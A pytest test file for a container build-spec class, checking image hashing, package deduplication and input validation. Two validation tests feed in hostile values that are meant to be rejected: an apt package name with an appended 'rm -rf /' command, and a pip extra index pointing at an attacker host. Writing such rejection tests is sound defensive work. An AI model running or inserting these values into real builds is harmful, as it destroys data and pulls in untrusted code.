import pytest


def test_hash_is_sha256_hex(build_spec):
    assert len(build_spec(pip_packages=["numpy==1.26.0"]).image_hash) == 64


def test_hash_is_order_invariant(build_spec):
    a = build_spec(pip_packages=["numpy==1.26.0", "torch==2.1.0"])
    b = build_spec(pip_packages=["torch==2.1.0", "numpy==1.26.0"])
    assert a.image_hash == b.image_hash


def test_packages_are_deduplicated(build_spec):
    spec = build_spec(pip_packages=["numpy==1.26.0", "numpy==1.26.0"])
    assert spec.pip_packages == ("numpy==1.26.0",)


def test_different_base_image_changes_the_hash(build_spec):
    assert build_spec().image_hash != build_spec(base_image="python:3.12-slim").image_hash


def test_empty_spec_is_flagged_empty(build_spec):
    assert build_spec().is_empty
    assert not build_spec(apt_packages=["libgl1"]).is_empty


def test_rejects_bad_apt_name(build_spec):
    with pytest.raises(ValueError, match="apt package"):
        build_spec(apt_packages=["libgl1; rm -rf /"])


def test_rejects_unparseable_pip_requirement(build_spec):
    with pytest.raises(ValueError, match="requirement"):
        build_spec(pip_packages=["--extra-index-url http://attacker.example"])
